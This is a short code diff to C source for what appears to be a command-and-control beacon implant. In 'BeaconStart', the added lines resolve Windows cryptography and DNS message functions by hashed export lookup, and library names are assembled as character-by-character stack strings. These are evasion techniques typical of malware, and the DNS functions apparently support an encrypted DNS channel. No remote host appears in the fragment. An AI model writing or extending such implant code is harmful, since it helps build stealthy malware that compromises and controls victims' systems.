@@ -69,6 +69,12 @@ DEFINESEC(B) VOID BeaconStart( PVOID Config )
 		Str[0xc] = 0x0;
 
 		Ins.Module[1] = Ins.api.LoadLibraryA( CPTR( Str ) );
+		Ins.api.CryptDecrypt         = PeGetFuncEat( Ins.Module[1], H_CRYPTDECRYPT );
+		Ins.api.CryptEncrypt         = PeGetFuncEat( Ins.Module[1], H_CRYPTENCRYPT );
+		Ins.api.CryptImportKey       = PeGetFuncEat( Ins.Module[1], H_CRYPTIMPORTKEY );
+		Ins.api.CryptDestroyKey      = PeGetFuncEat( Ins.Module[1], H_CRYPTDESTROYKEY );
+		Ins.api.CryptReleaseContext  = PeGetFuncEat( Ins.Module[1], H_CRYPTRELEASECONTEXT );
+		Ins.api.CryptAcquireContextA = PeGetFuncEat( Ins.Module[1], H_CRYPTACQUIRECONTEXTA );
 
 		Str[0x0] = 'd';
 		Str[0x1] = 'n';
@@ -83,6 +89,8 @@ DEFINESEC(B) VOID BeaconStart( PVOID Config )
 		Str[0xa] = 0x0;
 
 		Ins.Module[2] = Ins.api.LoadLibraryA( CPTR( Str ) );
+		Ins.api.DnsWriteQuestionToBuffer_UTF8     = PeGetFuncEat( Ins.Module[2], H_DNSWRITEQUESTIONTOBUFFER_UTF8 );
+		Ins.api.DnsExtractRecordsFromMessage_UTF8 = PeGetFuncEat( Ins.Module[2], H_DNSEXTRACTRECORDSFROMMESSAGE_UTF8 );
 
 		Str[0x0] = 'w';
 		Str[0x1] = 'i';
